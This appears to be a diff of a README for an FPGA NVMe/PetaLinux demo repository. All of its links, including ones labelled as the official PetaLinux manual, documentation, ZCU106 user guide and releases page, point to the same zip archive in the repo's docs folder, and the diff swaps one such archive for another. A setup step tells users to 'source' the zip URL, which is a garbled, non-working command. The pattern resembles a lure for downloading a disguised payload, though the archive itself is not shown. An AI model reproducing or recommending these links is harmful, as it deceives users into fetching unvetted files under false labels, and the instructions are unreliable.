@@ -1,6 +1,6 @@
 # 🚀 nvmeg4ip-dma-plnx-demo - Quick Setup for Your FPGA Device
 
-[![Download](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip)](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip)
+[![Download](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip)](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ To get started with **nvmeg4ip-dma-plnx-demo**, follow these steps:
 2. **Visit the Releases Page to Download**
 
    Go to the following link to access the downloads:
-   [Visit Releases Page](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip)
+   [Visit Releases Page](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip)
 
 ## 🔧 Download & Install
 
@@ -29,7 +29,7 @@ To get started with **nvmeg4ip-dma-plnx-demo**, follow these steps:
 
 2. **Install PetaLinux**
 
-   If you haven’t already set up PetaLinux, you will need to do so. Follow the official [PetaLinux Manual](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip) for guidance on installation and setup.
+   If you haven’t already set up PetaLinux, you will need to do so. Follow the official [PetaLinux Manual](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip) for guidance on installation and setup.
 
 3. **Follow the Installation Steps**
 
@@ -38,7 +38,7 @@ To get started with **nvmeg4ip-dma-plnx-demo**, follow these steps:
    Run the following commands:
 
    ```bash
-   source https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip
+   source https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip
    petalinux-create -t project -n my_project
    cd my_project
    petalinux-config --get-hw-description=/path/to/hw/description
@@ -94,8 +94,8 @@ If you encounter issues, here are common troubleshooting steps:
 
 ## 📜 Additional Resources
 
-- [PetaLinux Documentation](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip)
-- [ZCU106 User Guide](https://raw.githubusercontent.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/main/docs/nvmeg4ip-dma-plnx-demo-v3.0.zip)
+- [PetaLinux Documentation](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip)
+- [ZCU106 User Guide](https://github.com/yoitsmeg/nvmeg4ip-dma-plnx-demo/raw/refs/heads/main/docs/plnx_nvmeg_demo_ip_dma_2.4.zip)
 
 For more information on features and technical details about this demo, you can explore the source code provided in the repository.
 
